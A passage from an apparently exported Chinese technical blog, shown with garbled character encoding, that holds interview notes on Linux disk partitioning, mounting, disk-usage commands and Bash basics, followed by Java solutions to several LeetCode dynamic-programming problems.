<p>1)Linuxæ¥è¯´æ— è®ºæœ‰å‡ ä¸ªåˆ†åŒºï¼Œåˆ†ç»™å“ªä¸€ç›®å½•ä½¿ç”¨ï¼Œå®ƒå½’æ ¹ç»“åº•å°±åªæœ‰ä¸€ä¸ªæ ¹ç›®å½•ï¼Œä¸€ä¸ªç‹¬ç«‹ä¸”å”¯ä¸€çš„æ–‡ä»¶ç»“æ„ , Linuxä¸­æ¯ä¸ªåˆ†åŒºéƒ½æ˜¯ç”¨æ¥ç»„æˆæ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ã€‚</p>
<p>2)Linuxé‡‡ç”¨äº†ä¸€ç§å«â€œè½½å…¥â€çš„å¤„ç†æ–¹æ³•ï¼Œå®ƒçš„æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­åŒ…å«äº†ä¸€æ•´å¥—çš„æ–‡ä»¶å’Œç›®å½•ï¼Œä¸”å°†ä¸€ä¸ªåˆ†åŒºå’Œä¸€ä¸ªç›®å½•è”ç³»èµ·æ¥ã€‚è¿™æ—¶è¦è½½å…¥çš„ä¸€ä¸ªåˆ†åŒºå°†ä½¿å®ƒçš„å­˜å‚¨ç©ºé—´åœ¨ä¸€ä¸ªç›®å½•ä¸‹è·å¾—ã€‚</p>
<p>ç¡¬ç›˜è¯´æ˜</p>
<p>1)Linuxç¡¬ç›˜åˆ†IDEç¡¬ç›˜å’ŒSCSIç¡¬ç›˜ï¼Œç›®å‰åŸºæœ¬ä¸Šæ˜¯SCSIç¡¬ç›˜</p>
<p>2)å¯¹äºIDEç¡¬ç›˜ï¼Œé©±åŠ¨å™¨æ ‡è¯†ç¬¦ä¸ºâ€œhdxâ€,å…¶ä¸­â€œhdâ€è¡¨æ˜åˆ†åŒºæ‰€åœ¨è®¾å¤‡çš„ç±»å‹ï¼Œè¿™é‡Œæ˜¯æŒ‡IDEç¡¬ç›˜äº†ã€‚â€œxâ€ä¸ºç›˜å·ï¼ˆaä¸ºåŸºæœ¬ç›˜ï¼Œbä¸ºåŸºæœ¬ä»å±ç›˜ï¼Œcä¸ºè¾…åŠ©ä¸»ç›˜ï¼Œdä¸ºè¾…åŠ©ä»å±ç›˜ï¼‰,â€œâ€ä»£è¡¨åˆ†åŒºï¼Œå‰å››ä¸ªåˆ†åŒºç”¨æ•°å­—1åˆ°4è¡¨ç¤ºï¼Œå®ƒä»¬æ˜¯ä¸»åˆ†åŒºæˆ–æ‰©å±•åˆ†åŒºï¼Œä»5å¼€å§‹å°±æ˜¯é€»è¾‘åˆ†åŒºã€‚ä¾‹ï¼Œhda3è¡¨ç¤ºä¸ºç¬¬ä¸€ä¸ªIDEç¡¬ç›˜ä¸Šçš„ç¬¬ä¸‰ä¸ªä¸»åˆ†åŒºæˆ–æ‰©å±•åˆ†åŒº,hdb2è¡¨ç¤ºä¸ºç¬¬äºŒä¸ªIDEç¡¬ç›˜ä¸Šçš„ç¬¬äºŒä¸ªä¸»åˆ†åŒºæˆ–æ‰©å±•åˆ†åŒºã€‚</p>
<p>3)å¯¹äºSCSIç¡¬ç›˜åˆ™æ ‡è¯†ä¸ºâ€œsdx~â€ï¼ŒSCSIç¡¬ç›˜æ˜¯ç”¨â€œsdâ€æ¥è¡¨ç¤ºåˆ†åŒºæ‰€åœ¨è®¾å¤‡çš„ç±»å‹çš„ï¼Œå…¶ä½™åˆ™å’ŒIDEç¡¬ç›˜çš„è¡¨ç¤ºæ–¹æ³•ä¸€æ ·ã€‚sdb1 [è¡¨ç¤ºç¬¬2å—scsi ç¡¬ç›˜çš„ç¬¬1ä¸ªåˆ†åŒº]</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211829424.png" alt="image-20211019193102040"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥çœ‹æ‰€æœ‰è®¾å¤‡çš„æŒ‚è½½æƒ…å†µ list block</span></span><br><span class="line">lsblk -f</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">åˆ†åŒºå‘½ä»¤</span></span><br><span class="line">fdisk /dev/sdb</span><br><span class="line"></span><br><span class="line">å¼€å§‹å¯¹/sdbåˆ†åŒº</span><br><span class="line">m   æ˜¾ç¤ºå‘½ä»¤åˆ—è¡¨</span><br><span class="line">p    æ˜¾ç¤ºç£ç›˜åˆ†åŒº åŒ fdisk  â€“l</span><br><span class="line">n    æ–°å¢åˆ†åŒº</span><br><span class="line">d    åˆ é™¤åˆ†åŒº</span><br><span class="line">w   å†™å…¥å¹¶é€€å‡º</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ ¼å¼åŒ–ç£ç›˜ ext4æ˜¯åˆ†åŒºç±»å‹ make file system</span></span><br><span class="line">mkfs -t ext4 /dev/sdb1</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŒ‚è½½ ç”¨å‘½ä»¤è¡ŒæŒ‚è½½é‡å¯åä¼šå¤±æ•ˆ</span></span><br><span class="line">mount /dev/sdb1 /home/newdisk</span><br><span class="line">umount /dev/sdb1 æˆ–è€… umount /home/newdisk</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ°¸ä¹…æŒ‚è½½</span></span><br><span class="line">vim /etc/fstab</span><br><span class="line">mount -a</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç£ç›˜æƒ…å†µæŸ¥è¯¢ disk free</span></span><br><span class="line">df -h</span><br><span class="line"></span><br><span class="line">du -h  /ç›®å½•</span><br><span class="line">   -s æŒ‡å®šç›®å½•å ç”¨å¤§å°æ±‡æ€»</span><br><span class="line">   -h å¸¦è®¡é‡å•ä½</span><br><span class="line">   -a å«æ–‡ä»¶</span><br><span class="line">   --max-depth=1  å­ç›®å½•æ·±åº¦</span><br><span class="line">   -c åˆ—å‡ºæ˜ç»†çš„åŒæ—¶ï¼Œå¢åŠ æ±‡æ€»å€¼</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥è¯¢ /usrç›®å½•çš„ç£ç›˜å ç”¨æƒ…å†µï¼Œæ·±åº¦ä¸º1</span></span><br><span class="line">du  -ach  --max-depth=1  /usr</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç»Ÿè®¡/homeæ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶çš„ä¸ªæ•°</span></span><br><span class="line">ls -la /home/ | grep &quot;^-&quot; | wc -l</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç»Ÿè®¡/home æ–‡ä»¶å¤¹ä¸‹ç›®å½•çš„ä¸ªæ•°ï¼ŒåŒ…æ‹¬å­æ–‡ä»¶å¤¹é‡Œçš„</span></span><br><span class="line">ls -lr /home/ | grep &quot;^d&quot; | wc -l</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä»¥æ ‘çŠ¶æ˜¾ç¤º home ç›®å½•ç»“æ„</span></span><br><span class="line">yum install tree</span><br><span class="line">tree /home</span><br></pre></td></tr></table></figure>

<h2 id="Shellå’ŒBash"><a href="#Shellå’ŒBash" class="headerlink" title="Shellå’ŒBash"></a>Shellå’ŒBash</h2><p>Shell è¿™ä¸ªå•è¯çš„åŸæ„æ˜¯â€œå¤–å£³â€ï¼Œè·Ÿ kernelï¼ˆå†…æ ¸ï¼‰ç›¸å¯¹åº”ï¼Œæ¯”å–»å†…æ ¸å¤–é¢çš„ä¸€å±‚ï¼Œå³ç”¨æˆ·è·Ÿå†…æ ¸äº¤äº’çš„å¯¹è¯ç•Œé¢ã€‚</p>
<p>é¦–å…ˆï¼ŒShell æ˜¯ä¸€ä¸ªç¨‹åºï¼Œæä¾›ä¸€ä¸ªä¸ç”¨æˆ·å¯¹è¯çš„ç¯å¢ƒã€‚è¿™ä¸ªç¯å¢ƒåªæœ‰ä¸€ä¸ªå‘½ä»¤æç¤ºç¬¦ï¼Œè®©ç”¨æˆ·ä»é”®ç›˜è¾“å…¥å‘½ä»¤ï¼Œæ‰€ä»¥åˆç§°ä¸ºå‘½ä»¤è¡Œç¯å¢ƒï¼ˆcommand line interfaceï¼Œç®€å†™ä¸º CLIï¼‰ã€‚Shell æ¥æ”¶åˆ°ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤ï¼Œå°†å‘½ä»¤é€å…¥æ“ä½œç³»ç»Ÿæ‰§è¡Œï¼Œå¹¶å°†ç»“æœè¿”å›ç»™ç”¨æˆ·ã€‚</p>
<p>å…¶æ¬¡ï¼ŒShell æ˜¯ä¸€ä¸ªå‘½ä»¤è§£é‡Šå™¨ï¼Œè§£é‡Šç”¨æˆ·è¾“å…¥çš„å‘½ä»¤ã€‚å®ƒæ”¯æŒå˜é‡ã€æ¡ä»¶åˆ¤æ–­ã€å¾ªç¯æ“ä½œç­‰è¯­æ³•ï¼Œæ‰€ä»¥ç”¨æˆ·å¯ä»¥ç”¨ Shell å‘½ä»¤å†™å‡ºå„ç§å°ç¨‹åºï¼Œåˆç§°ä¸ºè„šæœ¬ï¼ˆscriptï¼‰ã€‚è¿™äº›è„šæœ¬éƒ½é€šè¿‡ Shell çš„è§£é‡Šæ‰§è¡Œï¼Œè€Œä¸é€šè¿‡ç¼–è¯‘ã€‚</p>
<p>æœ€åï¼ŒShell æ˜¯ä¸€ä¸ªå·¥å…·ç®±ï¼Œæä¾›äº†å„ç§å°å·¥å…·ï¼Œä¾›ç”¨æˆ·æ–¹ä¾¿åœ°ä½¿ç”¨æ“ä½œç³»ç»Ÿçš„åŠŸèƒ½ã€‚</p>
<p>Shell æœ‰å¾ˆå¤šç§ï¼Œåªè¦èƒ½ç»™ç”¨æˆ·æä¾›å‘½ä»¤è¡Œç¯å¢ƒçš„ç¨‹åºï¼Œéƒ½å¯ä»¥çœ‹ä½œæ˜¯ Shellã€‚</p>
<p>å†å²ä¸Šï¼Œä¸»è¦çš„ Shell æœ‰ä¸‹é¢è¿™äº›ã€‚</p>
<ul>
<li>Bourne Shellï¼ˆshï¼‰</li>
<li>Bourne Again shellï¼ˆbashï¼‰</li>
<li>C Shellï¼ˆcshï¼‰</li>
<li>TENEX C Shellï¼ˆtcshï¼‰</li>
<li>Korn shellï¼ˆkshï¼‰</li>
<li>Z Shellï¼ˆzshï¼‰</li>
<li>Friendly Interactive Shellï¼ˆfishï¼‰</li>
</ul>
<p>Bash æ˜¯ç›®å‰æœ€å¸¸ç”¨çš„ Shellï¼Œé™¤éç‰¹åˆ«æŒ‡æ˜ï¼Œä¸‹æ–‡çš„ Shell å’Œ Bash å½“ä½œåŒä¹‰è¯ä½¿ç”¨ï¼Œå¯ä»¥äº’æ¢ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">æŸ¥çœ‹å½“å‰è¿è¡Œçš„ Shell</span></span><br><span class="line">echo $SHELL</span><br><span class="line">/bin/bash</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æŸ¥çœ‹å½“å‰çš„ Linux ç³»ç»Ÿå®‰è£…çš„æ‰€æœ‰ Shell</span></span><br><span class="line">cat /etc/shells</span><br></pre></td></tr></table></figure>

<p>Linux å…è®¸æ¯ä¸ªç”¨æˆ·ä½¿ç”¨ä¸åŒçš„ Shellï¼Œç”¨æˆ·çš„é»˜è®¤ Shell ä¸€èˆ¬éƒ½æ˜¯ Bashï¼Œæˆ–è€…ä¸ Bash å…¼å®¹ã€‚</p>
<p>æ ¹ç”¨æˆ·ï¼ˆrootï¼‰çš„æç¤ºç¬¦ï¼Œä¸ä»¥ç¾å…ƒç¬¦å·ï¼ˆ<code>$</code>ï¼‰ç»“å°¾ï¼Œè€Œä»¥äº•å·ï¼ˆ<code>#</code>ï¼‰ç»“å°¾ï¼Œç”¨æ¥æé†’ç”¨æˆ·ï¼Œç°åœ¨å…·æœ‰æ ¹æƒé™ï¼Œå¯ä»¥æ‰§è¡Œå„ç§æ“ä½œï¼ŒåŠ¡å¿…å°å¿ƒï¼Œä¸è¦å‡ºç°è¯¯æ“ä½œã€‚è¿™ä¸ªç¬¦å·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰çš„</p>
<p>è¿›å…¥å‘½ä»¤è¡Œç¯å¢ƒä»¥åï¼Œä¸€èˆ¬å°±å·²ç»æ‰“å¼€ Bash äº†ã€‚å¦‚æœä½ çš„ Shell ä¸æ˜¯ Bashï¼Œå¯ä»¥è¾“å…¥<code>bash</code>å‘½ä»¤å¯åŠ¨ Bashã€‚</p>
<h2 id="åŠ¨æ€ç›‘æ§è¿›ç¨‹"><a href="#åŠ¨æ€ç›‘æ§è¿›ç¨‹" class="headerlink" title="åŠ¨æ€ç›‘æ§è¿›ç¨‹"></a>åŠ¨æ€ç›‘æ§è¿›ç¨‹</h2><p> topä¸pså‘½ä»¤å¾ˆç›¸ä¼¼ã€‚å®ƒä»¬éƒ½ç”¨æ¥æ˜¾ç¤ºæ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹ã€‚Topä¸psæœ€å¤§çš„ä¸åŒä¹‹å¤„ï¼Œåœ¨äºtopåœ¨æ‰§è¡Œä¸€æ®µæ—¶é—´å¯ä»¥æ›´æ–°æ­£åœ¨è¿è¡Œçš„çš„è¿›ç¨‹ï¼ˆé»˜è®¤æ¯3ç§’å˜åŒ–ä¸€æ¬¡ï¼‰ã€‚</p>
<table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td>-d  ç§’æ•°</td>
<td>æŒ‡å®štopå‘½ä»¤æ¯éš”å‡ ç§’æ›´æ–°ã€‚é»˜è®¤æ˜¯3ç§’åœ¨topå‘½ä»¤çš„äº¤äº’æ¨¡å¼å½“ä¸­å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤ã€‚</td>
</tr>
<tr>
<td>-i</td>
<td>ä½¿topä¸æ˜¾ç¤ºä»»ä½•é—²ç½®æˆ–è€…åƒµæ­»è¿›ç¨‹ã€‚</td>
</tr>
<tr>
<td>-p</td>
<td>é€šè¿‡æŒ‡å®šç›‘æ§è¿›ç¨‹IDæ¥ä»…ä»…ç›‘æ§æŸä¸ªè¿›ç¨‹çš„çŠ¶æ€ã€‚</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>æ“ä½œ</th>
<th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td>P</td>
<td>ä»¥CPUä½¿ç”¨ç‡æ’åºï¼Œé»˜è®¤å°±æ˜¯æ­¤é¡¹</td>
</tr>
<tr>
<td>M</td>
<td>ä»¥å†…å­˜çš„ä½¿ç”¨ç‡æ’åº</td>
</tr>
<tr>
<td>N</td>
<td>ä»¥PIDæ’åº</td>
</tr>
<tr>
<td>q</td>
<td>é€€å‡ºtop</td>
</tr>
<tr>
<td>u  è¾“å…¥ç”¨æˆ·å</td>
<td>ç›‘è§†ç‰¹å®šç”¨æˆ·</td>
</tr>
<tr>
<td>k  è¿›ç¨‹IDå·</td>
<td>ç»ˆæ­¢æŒ‡å®šçš„è¿›ç¨‹</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode</title>
    <url>/2021/12/21/%E9%9D%A2%E8%AF%95/LeetCode/</url>
    <content><![CDATA[<h3 id="ç®—æ³•"><a href="#ç®—æ³•" class="headerlink" title="ç®—æ³•"></a>ç®—æ³•</h3><h2 id="åŠ¨æ€è§„åˆ’"><a href="#åŠ¨æ€è§„åˆ’" class="headerlink" title="åŠ¨æ€è§„åˆ’"></a>åŠ¨æ€è§„åˆ’</h2><h3 id="70-çˆ¬æ¥¼æ¢¯-x2F-x2F-x2F"><a href="#70-çˆ¬æ¥¼æ¢¯-x2F-x2F-x2F" class="headerlink" title="70. çˆ¬æ¥¼æ¢¯&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/climbing-stairs/">70. çˆ¬æ¥¼æ¢¯</a>&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åŠ¨æ€è§„åˆ’</span></span><br><span class="line"><span class="comment">// æœ€åä¸€æ­¥å¯èƒ½è·¨äº†ä¸€çº§å°é˜¶ï¼Œä¹Ÿå¯èƒ½è·¨äº†ä¸¤çº§å°é˜¶ï¼Œæ‰€ä»¥å¯ä»¥åˆ—å‡ºå¦‚ä¸‹å¼å­:f(x)=f(xâˆ’1)+f(xâˆ’2)</span></span><br><span class="line"><span class="comment">// ä½¿ç”¨æ»šåŠ¨æ•°ç»„æ€æƒ³</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">climbStairs</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">p</span> <span class="operator">=</span> <span class="number">0</span>, q = <span class="number">0</span>, r = <span class="number">1</span>; <span class="comment">// på’Œqåˆå§‹åŒ–ä¸º0, rè¡¨ç¤ºf(0)=1</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      p = q;</span><br><span class="line">      q = r;</span><br><span class="line">      r = p + q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-æœ€é•¿å›æ–‡å­ä¸²-x2F-x2F-x2F"><a href="#5-æœ€é•¿å›æ–‡å­ä¸²-x2F-x2F-x2F" class="headerlink" title="5. æœ€é•¿å›æ–‡å­ä¸²&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/longest-palindromic-substring/">5. æœ€é•¿å›æ–‡å­ä¸²</a>&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//é¢‘ç¹ä½¿ç”¨s.charAt(i)çš„è¯æ—¶é—´ä¼šæ›´é•¿,å¯ä»¥è½¬åŒ–ä¸ºcharArray</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">longestPalindrome</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[len][len];</span><br><span class="line">        <span class="type">char</span>[] charArray = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            dp[i][i] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxLen</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; j ; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (charArray[i] == charArray[j]) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (j - i &lt; <span class="number">3</span>) &#123;</span><br><span class="line">                        dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (dp[i + <span class="number">1</span>][j - <span class="number">1</span>] == <span class="literal">true</span>) &#123;</span><br><span class="line">                            dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (dp[i][j] &amp;&amp; j - i + <span class="number">1</span> &gt; maxLen) &#123;</span><br><span class="line">                    start = i;</span><br><span class="line">                    maxLen = j - i + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substring(start, start + maxLen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="53-æœ€å¤§å­åºå’Œ-x2F-x2F"><a href="#53-æœ€å¤§å­åºå’Œ-x2F-x2F" class="headerlink" title="53. æœ€å¤§å­åºå’Œ&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/maximum-subarray/">53. æœ€å¤§å­åºå’Œ</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åŠ¨æ€è§„åˆ’</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxSum</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                sum = sum + nums[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sum = nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            maxSum = Math.max(sum, maxSum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxSum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="121-ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº-x2F-x2F-x2F-x2F"><a href="#121-ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº-x2F-x2F-x2F-x2F" class="headerlink" title="121. ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº&#x2F;&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/">121. ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº</a>&#x2F;&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ—¶åˆ»æ›´æ–°startä½ç½®</span></span><br><span class="line"><span class="comment">//åŠ¨æ€è§„åˆ’ å‰iå¤©çš„æœ€å¤§æ”¶ç›Š = max&#123;å‰i-1å¤©çš„æœ€å¤§æ”¶ç›Šï¼Œç¬¬iå¤©çš„ä»·æ ¼-å‰i-1å¤©ä¸­çš„æœ€å°ä»·æ ¼&#125;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> prices[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prices[i] &lt; min) &#123;</span><br><span class="line">                min = prices[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                max = Math.max(max, prices[i] - min);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="122-ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº-II"><a href="#122-ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº-II" class="headerlink" title="122. ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº II"></a><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-ii">122. ä¹°å–è‚¡ç¥¨çš„æœ€ä½³æ—¶æœº II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åªè¦ç¬¬äºŒå¤©æ¯”ç¬¬ä¸€å¤©å¤§å°±ä¹°, </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prices[i] &gt; prices[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                res += prices[i] - prices[i-<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="62-ä¸åŒè·¯å¾„-x2F-x2F-x2F"><a href="#62-ä¸åŒè·¯å¾„-x2F-x2F-x2F" class="headerlink" title="62. ä¸åŒè·¯å¾„&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/unique-paths/">62. ä¸åŒè·¯å¾„</a>&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åŠ¨æ€è§„åˆ’</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">uniquePaths</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m][n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dp[i][j] = dp[i][j - <span class="number">1</span>] + dp[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ’åˆ—ç»„åˆ</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">uniquePaths</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="comment">// åªè·Ÿç¬¬å‡ è¡Œç¬¬å‡ åˆ—æœ‰å…³,ä»m + n - 2æ­¥ä¸­æŠ½å‡ºm - 1æ­¥</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Math.min(m - <span class="number">1</span>, n - <span class="number">1</span>); i++) &#123;</span><br><span class="line">      ans *= m + n - <span class="number">2</span> - i;</span><br><span class="line">      ans /= i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>)ans;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

